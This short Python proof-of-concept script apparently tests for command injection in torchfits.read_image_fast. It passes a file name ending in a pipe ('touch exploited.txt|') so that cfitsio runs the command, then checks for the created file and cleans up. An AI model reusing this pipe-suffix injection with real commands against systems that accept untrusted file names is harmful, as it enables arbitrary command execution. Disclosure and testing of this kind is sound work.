import torchfits
import os

# This script demonstrates a Command Injection vulnerability in torchfits.read_image_fast
# The filename argument is passed directly to cfitsio, which supports pipe syntax.
# If the filename ends with '|', the part before it is executed as a shell command.

# Create a harmless file to prove execution
exploit_file = "exploited.txt"
if os.path.exists(exploit_file):
    os.remove(exploit_file)

# The command to execute: touch exploited.txt
command = f"touch {exploit_file}"
payload = f"{command}|"

print(f"Attempting to execute payload: {payload}")

try:
    # Trigger the vulnerability
    # We expect an error because the output of the command is not a valid FITS file,
    # but the command should execute before the error is thrown.
    torchfits.read_image_fast(payload)
except Exception as e:
    print(f"Caught expected exception: {e}")

if os.path.exists(exploit_file):
    print("VULNERABILITY CONFIRMED: exploited.txt was created!")
else:
    print("Exploit failed: exploited.txt was not created (VULNERABILITY FIXED).")

# Cleanup
if os.path.exists(exploit_file):
    os.remove(exploit_file)
